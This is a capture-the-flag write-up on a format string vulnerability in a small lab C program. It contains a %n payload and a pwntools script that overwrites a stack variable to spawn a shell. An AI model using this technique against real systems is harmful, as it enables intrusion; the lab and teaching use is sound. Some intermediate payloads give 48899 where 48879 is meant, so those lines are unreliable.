---
slug: "pwn-rotten-beef"
title: "Rotten Beef"
competition: "Alpacahack"
category: "Pwn"
difficulty: "Medium"
date: "2026-11-01"
updated: "2026-11-01"
summary: "Arbitrary Write, format string attack."
tags: ["ARBITRARY WRITE","FORMAT STRING"]
status: "published"
flag: "Alpaca{format_str1ng_is_s0_fun}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-rotten-beef"
---

# Rotten Beef

> Arbitrary Write, format string attack.

## Recon

Check the source code as usual first.

```bash
// gcc -o chal main.c -O0

#include <stdio.h>
#include <unistd.h>

int main(void) {
    int key = 0xdead, dummy = 0xdead;
    char buffer[12];
    printf("input > ");
    scanf("%11s", buffer);
    printf("Your input: ");
    printf(buffer, &key, &dummy); // !?
    printf("\n");
    if(key == 0xbeef){
        printf("key = 0x%x (dummy = 0x%x), ok!\n", key, dummy);
        printf("Congratulations! spawning shell...\n");
        execve("/bin/sh", NULL, NULL);
    }
    else{
        printf("key = 0x%x (dummy = 0x%x), try again!\n", key, dummy);
    }
    return 0;
}

__attribute__((constructor))
void setup() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
```

## Vulnerability

At that source code, there’s a format string attack vulnerability, especially at this snippet:

```jsx
    printf(buffer, &key, &dummy); // !?
```

Because its using `printf` without the argument like `%d`, or something like that. So we can use `%p, %n, etc` at buffer so we can exploit it. Not to mention, after buffer there’s the `&key` which is that is our target for overwriting to `0xbeef` using `arbitrary write` technique.

## Exploit plan

As we can see in the image, the orange one is declaration the variable. So the `rbp-0x1c` its where `key` is stored. The red one is the vulnerability printf for format string attack, we can see the `rbp-0x1c` is stored in `rcx`, so we can do the arbitrary write at `rcx`. This is the mapping:

```
%1$p -> rsi
%2$p -> rdx
%3$p -> rcx
%4$p -> r8
%5$p -> r9
%6$p -> [rsp+0x00]   <- start read STACK
%7$p -> [rsp+0x08]
%8$p -> [rsp+0x10]
...
```

![image.png](/assets/uploads/a72817c0-ab07-4499-a8b6-0765dc1f9e14-image.png)

But honestly we have 2 option, overwrite to `rcx` or `rsi`, both are the same tho. `rsi` mapped at `%1`, `rcx` mapped at `%3`, we just change the target number only.

So now we assemble the payload. Firstly we transform the `0xbeef` to decimal first.

```jsx
>>> 0xbeef
48879
```

We can write the first stage of exploit now.

```jsx
%48899c
```

This means `printf()` will print a single character with a total field width of 48,879 characters, and it can be chained by our next stage of arbitrary write. Cuz the next stage will write the `48879` to the target.

The second stage you can freely choose `%3 (rcx)` or `%1 (rsi)`, both are the same.

```jsx
%48899c%3
```

At this case i choose `rcx`.

For the third stage or the arbitrary write, we choose `%n` than `%hn`, even though the `%hn` is specifically for 2 bytes, the program doesn’t allow that because we only can input up to 11 bytes, still the same output though.

So we can conclude this is the final payload:

```jsx
%48899c%3$n
```

![image.png](/assets/uploads/ffbcaea9-ef08-46f1-b58b-9ded5eede0a8-image-1.png)

Got it.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("chal_patched")

context.binary = elf
context.terminal = ["ghostty", "-e"]
# Use the portable pwndbg bundle (/usr/local/bin/pwndbg) as the gdb pwntools launches.
# It ships its own gdb+python and loads pwndbg itself, so there is no gdbinit.py to source.
context.gdb_binary = "pwndbg"

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    payload = b'%48879c%3$n'
    # good luck pwning :)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```
